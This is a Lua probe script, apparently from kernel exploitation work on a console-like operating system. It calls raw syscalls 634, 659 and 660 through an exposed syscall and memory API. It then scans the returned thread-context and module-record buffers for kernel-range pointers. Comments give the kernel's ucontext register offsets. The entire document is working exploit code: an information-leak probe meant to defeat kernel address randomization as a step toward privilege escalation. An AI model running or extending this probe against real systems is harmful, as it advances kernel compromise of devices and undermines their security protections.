-- CRASH_CLASS: LOW
-- PROBE 1227a: thr_get_ucontext(634) copies a thread's context out; dynlib_get_list2/info2 (659/660)
-- copy module records out. All three are scanned for supervisor-range qwords.
--
-- 634 narg 2, body 0x265ef0 thunk; upstream's THREADING_ALIVE gives the context layout the kernel
-- reads on create (CS +0xc0, RIP +0xe0, RSP +0xf8, SS +0x100, gates +0x108/+0x0d0/+0x110).
-- A getter that returns the same 0x4c0-byte structure would expose whatever the kernel keeps in it.
print("=== PROBE 1227a: ucontext and dynlib record leaks ===")
local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function ES() local ok,s=pcall(function() return get_error_string() end) if ok then return tostring(s) end return "?" end
local function rd(a) local ok,v=pcall(function() return N(memory.read_dword(a)) end) if ok then return v end return -1 end
local function rq(a) local ok,v=pcall(function() return N(memory.read_qword(a)) end) if ok then return v end return nil end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function hilo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,N(v) end
local function call(tag, fn)
    local ok, rv = pcall(fn)
    if not ok then print(string.format("  [%s] PCALL-FAIL", tag)) return nil end
    local h,l = hilo(rv)
    print(string.format("  [%s] ret=0x%08X_%08X err=%s", tag, h, l, ES()))
    return rv
end
local function scan(tag, a, len)
    local kp, first = 0, nil
    for i = 0, len - 8, 8 do
        local v = rq(a + i)
        if v and v >= 0xFFFF800000000000 and v ~= 0xFFFFFFFFFFFFFFFF then
            kp = kp + 1
            if not first then first = string.format("+0x%X=0x%X", i, v) end
        end
    end
    print(string.format("    %s: %d supervisor-range qwords %s", tag, kp, first or ""))
    return kp
end
print(string.format("[0] pid=%d", N(mk(20)())))
local tid = N(mk(432)(uint64(0),uint64(0),uint64(0),uint64(0),uint64(0),uint64(0)))
print(string.format("[1] thr_self = 0x%X (%d) err=%s", tid, tid, ES()))
local ctx = memory.alloc(0x600)
for i=0,0x5FC,4 do wd(ctx+i,0xA5A5A5A5) end
call("634 self", function() return mk(634)(uint64(tid),uint64(ctx),uint64(0),uint64(0),uint64(0),uint64(0)) end)
local s={} for i=0,15 do s[#s+1]=string.format("%08X",rd(ctx+i*4)) end
print("    first 0x40: "..table.concat(s," "))
scan("634 self", ctx, 0x4c0)
for i=0,0x5FC,4 do wd(ctx+i,0xA5A5A5A5) end
call("634 pid", function() return mk(634)(uint64(N(mk(20)())),uint64(ctx),uint64(0),uint64(0),uint64(0),uint64(0)) end)
scan("634 pid", ctx, 0x4c0)

local mb = memory.alloc(0x1000)
print("[2] 660 dynlib_get_info2 ")
for i=0,0xFFC,4 do wd(mb+i,0xA5A5A5A5) end
wd(mb, 0x160)
call("660(0)", function() return mk(660)(uint64(0),uint64(mb),uint64(0),uint64(0),uint64(0),uint64(0)) end)
print(string.format("    [0..7]=%08X %08X %08X %08X", rd(mb), rd(mb+4), rd(mb+8), rd(mb+12)))
scan("660", mb, 0x180)
print("[3] 659 dynlib_get_list2")
for i=0,0xFFC,4 do wd(mb+i,0xA5A5A5A5) end
call("659(buf,0x100)", function() return mk(659)(uint64(mb),uint64(0x100),uint64(0),uint64(0),uint64(0),uint64(0)) end)
print(string.format("    [0..7]=%08X %08X %08X %08X", rd(mb), rd(mb+4), rd(mb+8), rd(mb+12)))
scan("659", mb, 0x180)
print(string.format("[Z] pid_end=%d", N(mk(20)())))
print("=== DONE ===")
